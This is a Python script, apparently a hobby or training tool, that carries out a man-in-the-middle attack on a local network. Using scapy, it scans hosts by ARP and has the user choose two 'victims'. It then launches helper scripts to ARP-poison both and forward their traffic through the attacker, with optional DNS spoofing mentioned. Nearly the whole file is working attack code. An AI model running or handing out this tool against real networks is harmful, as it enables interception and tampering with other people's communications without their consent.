from scapy.all import *
import os
import sys
import subprocess
import signal
import time


def clear():

    os.system('cls' if os.name == 'nt' else 'clear')


def find_ip_mac(iface):

    process = subprocess.run("ip a", shell=True, capture_output=True)
    output = str(process.stdout).split()

    #print(output)
    ip_mac = [""]*2
    for i in range(0, len(output)):
        if output[i] == iface+":":
            for k in range(i, len(output)):
                if output[k] == "inet":
                    ip_mac[0] = output[k+1]
                if output[k] == "link/ether":
                    ip_mac[1] = output[k+1]

        if i == len(output)-1 and (ip_mac[0] == "" or ip_mac[1] == ""):
            print("Error : no "+"ip"*(ip_mac[0] == "")+" and "*(ip_mac[0] == "" and ip_mac[1] == "")+"mac"*(ip_mac[1] == "")+" has be found for the given interface.\nThe program will shutdown.")
            sys.exit()

    while True:
        clear()
        print("Are those the IP adress and MAC adress of your computer on this LAN : "+ip_mac[0]+" ; "+ip_mac[1])
        choice = input()
        if choice == "yes":
            break
        elif choice == "no":
            ip_mac[0] = input("Please enter your IP adress (like this : 192.168.58.2/24) : ")
            ip_mac[1] = input("Please enter your MAC adress (like this : 08:00:27:bf:27:f4) : ")
        else:
            print("Please enter yes or no.")

    return ip_mac
    

def scan(ip, iface):

    clear()
    print("Scanning, please wait 5 seconds...")
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), iface=iface, timeout=5, verbose=False)
    clear()
    return ans


def chooose_victims(ip, face):
    
    ans = scan(ip, iface)

    while 1:
        iteration = 0
        ips_in_lan = []
        macs_in_lan = []
        victims = []
        for i in ans:
            if i[1].psrc != ip:
                if iteration == 0:
                    print("Computers on lan :")
                iteration += 1
                print(iteration, "-", i[1].psrc, ";", i[1].hwsrc)
                ips_in_lan.append(i[1].psrc)
                macs_in_lan.append(i[1].hwsrc)

        if iteration < 2:
            while 1:
                choice = input("\nNot enough computers on the network, do you wish to keep scanning until new computers connect to the lan : ")
                if choice == "no":
                    sys.exit()
                elif choice == "yes":
                    break
                elif choice != "oui":
                    print("Please enter yes or no.")

        elif iteration > 0:
            while 1:
                choice = input("Enter the number of the "+"first"*(len(victims)==0)+"second"*(len(victims)==1)+" machine you wish to attack : ")
                try:
                    choice == int(choice)
                    if int(choice) < 0 or int(choice) > iteration:
                        print("Please enter a valid number.")
                except ValueError:
                    print("Please enter a valid number")
                    choice = -1

                if int(choice) > -1 and int(choice) < iteration+1:
                    if len(victims) == 1 :
                        if int(choice) == victims[0]:
                            print("Please choose a different computer.")
                        else:
                            victims.append(int(choice))
                    else:
                        victims.append(int(choice))
                    if len(victims) == 2:
                        break

        if len(victims) == 2:
            break

    victims_infos = []
    for i in range(0,2):
        victims_infos.append(ips_in_lan[victims[i]-1])
        victims_infos.append(macs_in_lan[victims[i]-1])

    return victims_infos



clear()
print("MAN IN THE MIDDLE\n")
print("Please enable IP forwarding on your computer, launch the program as sudo and complete the file 'Resources/dns_spoof.txt' if you want to dns spoof.")
time.sleep(3)
clear()

process = []
clear()
iface = input("Enter the network interface you wish to attack on : ")
clear()
ip_mac = find_ip_mac(iface)
clear()
victims_infos = chooose_victims(ip_mac[0], iface)
clear()

print("ARP poisoning ongoing, please wait a few seconds...")

ip_mac[0] = ip_mac[0].split("/")[0]
fichier = open("Resources/informations.txt", "w")
informations = ""
for i in victims_infos:
    informations += i + " "
for i in ip_mac:
    informations += i + " "
informations += iface
fichier.write(informations)
fichier.close()
process.append(subprocess.Popen("python Resources/arp_poisoning.py".split(), stdout=subprocess.PIPE))

poisoning = [False]*2
pings = subprocess.Popen("python Resources/pings.py".split(), stdout=subprocess.PIPE)
for i in range(0,50):
    packets = sniff(iface=iface, filter="icmp", count=4)
    for p in packets:
        try:
            if p[IP].dst == victims_infos[0] and p[Ether].dst == ip_mac[1]:
                poisoning[0] = True
            if p[IP].dst == victims_infos[2] and p[Ether].dst == ip_mac[1]:
                poisoning[1] = True
        except IndexError:
            break
        if poisoning[0] == True and poisoning[1] == True:
            break
    if poisoning[0] == poisoning[1] == True:
            break
pings.terminate()

if poisoning[0] == poisoning[1] == True:
            clear()
            print("Poisoning successfull !\nStarting the Man in the Middle attack...")
            time.sleep(2)
            process.append(subprocess.Popen("python Resources/transfer_packets.py".split(), stdout=subprocess.PIPE))
            clear()
            print("Man in the middle ongoing...")

            while True:
                choice = input("Enter 'stop' to interrupt the program : ")
                if choice == "stop":
                    clear()
                    print("The program is shuting down...")
                    for i in process:
                        i.terminate()
                    break

print("Restoring ARP tables...")
for i in range(0, 10):
    send(ARP(pdst = victims_infos[0], psrc = victims_infos[2], hwsrc = victims_infos[1]), iface=iface, verbose=False)
    send(ARP(pdst = victims_infos[2], psrc = victims_infos[0], hwsrc = victims_infos[3]), iface=iface, verbose=False)
    time.sleep(1)

clear()
